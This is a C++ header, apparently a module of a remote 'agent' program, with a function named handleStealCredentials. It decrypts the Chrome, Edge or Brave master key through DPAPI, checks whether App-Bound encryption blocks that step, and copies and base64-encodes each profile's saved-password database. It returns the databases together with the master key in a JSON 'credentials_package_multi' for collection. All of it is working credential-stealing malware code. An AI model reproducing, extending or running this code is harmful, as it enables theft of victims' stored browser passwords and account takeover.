#pragma once
#include <windows.h>
#include <dpapi.h>
#include <wincrypt.h>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <iostream>
#include <nlohmann/json.hpp>

#pragma comment(lib, "crypt32.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

class ChromeRecovery
{
private:
    static std::vector<BYTE> WinAPI_Base64Decode(const std::string &input)
    {
        DWORD dwSize = 0;
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64_ANY, NULL, &dwSize, NULL, NULL))
            return {};
        std::vector<BYTE> buffer(dwSize);
        if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64_ANY, buffer.data(), &dwSize, NULL, NULL))
            return {};
        return buffer;
    }

    static std::string WinAPI_Base64Encode(const BYTE *data, DWORD len)
    {
        DWORD dwSize = 0;
        if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwSize))
            return "";
        std::string result(dwSize, 0);
        if (!CryptBinaryToStringA(data, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &dwSize))
            return "";
        if (!result.empty() && result.back() == '\0')
            result.pop_back();
        return result;
    }

public:
    // Hàm này trả về Pair: {Status Code, Key/Error Message}
    // Status: 0 = OK, 1 = App-Bound (Fail), 2 = Error
    static std::pair<int, std::string> GetMasterKey(const std::string &browserName)
    {
        char *localAppData = nullptr;
        size_t len = 0;
        _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
        if (!localAppData)
            return {2, "Env Error"};
        std::string path(localAppData);
        free(localAppData);

        if (browserName == "chrome")
            path += "\\Google\\Chrome\\User Data\\Local State";
        else if (browserName == "edge")
            path += "\\Microsoft\\Edge\\User Data\\Local State";
        else if (browserName == "brave")
            path += "\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
        else
            return {2, "Unknown Browser"};

        std::ifstream ifs(path, std::ios::binary);
        if (!ifs.is_open())
            return {2, "Local State not found"};

        json j;
        try
        {
            ifs >> j;
        }
        catch (...)
        {
            return {2, "JSON Parse Error"};
        }

        std::string encryptedKeyB64 = j["os_crypt"]["encrypted_key"];
        std::vector<BYTE> encryptedKey = WinAPI_Base64Decode(encryptedKeyB64);

        if (encryptedKey.size() < 5)
            return {2, "Key Invalid"};

        // --- KIỂM TRA HEADER ---
        // Header "DPAPI" -> Standard (Có thể giải mã)
        // Header "APPB"  -> App-Bound (Không thể giải mã từ Agent.exe)

        char header[5] = {0};
        memcpy(header, encryptedKey.data(), 4);
        std::string headerStr(header);

        if (headerStr == "APPB")
        {
            return {1, "APP-BOUND ENCRYPTION DETECTED (Cannot decrypt externally)"};
        }

        // Nếu là DPAPI (Standard), tiến hành giải mã
        DATA_BLOB in, out;
        in.pbData = encryptedKey.data() + 5;
        in.cbData = (DWORD)(encryptedKey.size() - 5);

        if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
        {
            std::string finalKey = WinAPI_Base64Encode(out.pbData, out.cbData);
            LocalFree(out.pbData);
            return {0, finalKey};
        }

        return {2, "CryptUnprotectData Failed"};
    }

    static json handleStealCredentials(const json &req)
    {
        std::string browser = req.value("browser", "chrome");

        // 1. Lấy Master Key và kiểm tra trạng thái
        auto [status, keyResult] = GetMasterKey(browser);

        // Nếu dính App-Bound
        if (status == 1)
        {
            return {
                {"type", "error"},
                {"message", "This browser is protected by App-Bound Encryption.\nAgent cannot decrypt passswords without Injection."}};
        }

        // Nếu lỗi khác
        if (status == 2 || keyResult.empty())
        {
            return {{"type", "error"}, {"message", "Key Error: " + keyResult}};
        }

        std::string masterKey = keyResult;

        // 2. Tiếp tục quy trình quét DB (Multi-Scan)
        char *localAppData = nullptr;
        size_t len = 0;
        _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
        std::string userDatapath(localAppData);
        free(localAppData);

        if (browser == "chrome")
            userDatapath += "\\Google\\Chrome\\User Data\\";
        else if (browser == "edge")
            userDatapath += "\\Microsoft\\Edge\\User Data\\";
        else if (browser == "brave")
            userDatapath += "\\BraveSoftware\\Brave-Browser\\User Data\\";

        json dbList = json::array();
        int foundCount = 0;

        std::cout << "[AGENT] Starting Multi-Scan in: " << userDatapath << "\n";

        try
        {
            if (fs::exists(userDatapath))
            {
                for (const auto &entry : fs::directory_iterator(userDatapath))
                {
                    if (entry.is_directory())
                    {
                        std::string profileName = entry.path().filename().string();
                        std::string dbPath = entry.path().string() + "\\Login Data";

                        if (fs::exists(dbPath))
                        {
                            // Lọc bớt file rác (<200KB)
                            uintmax_t fsize = fs::file_size(dbPath);
                            if (fsize < 100 * 1024)
                                continue;

                            std::string tempPath = "temp_" + browser + "_" + profileName;
                            if (CopyFileA(dbPath.c_str(), tempPath.c_str(), FALSE))
                            {
                                std::ifstream ifs(tempPath, std::ios::binary | std::ios::ate);
                                if (ifs.is_open())
                                {
                                    std::streamsize size = ifs.tellg();
                                    ifs.seekg(0, std::ios::beg);
                                    std::vector<BYTE> buffer(size);
                                    ifs.read((char *)buffer.data(), size);
                                    ifs.close();

                                    dbList.push_back({{"profile", profileName},
                                                      {"data", WinAPI_Base64Encode(buffer.data(), (DWORD)buffer.size())}});
                                    foundCount++;
                                    std::cout << "[DEBUG] Packed Profile DB: " << profileName << "\n";
                                }
                            }
                            std::remove(tempPath.c_str());
                        }
                    }
                }
            }
        }
        catch (...)
        {
        }

        if (foundCount == 0)
            return {{"type", "error"}, {"message", "No valid Login Data found."}};

        return {
            {"type", "credentials_package_multi"},
            {"browser", browser},
            {"master_key", masterKey},
            {"dbs", dbList}};
    }
};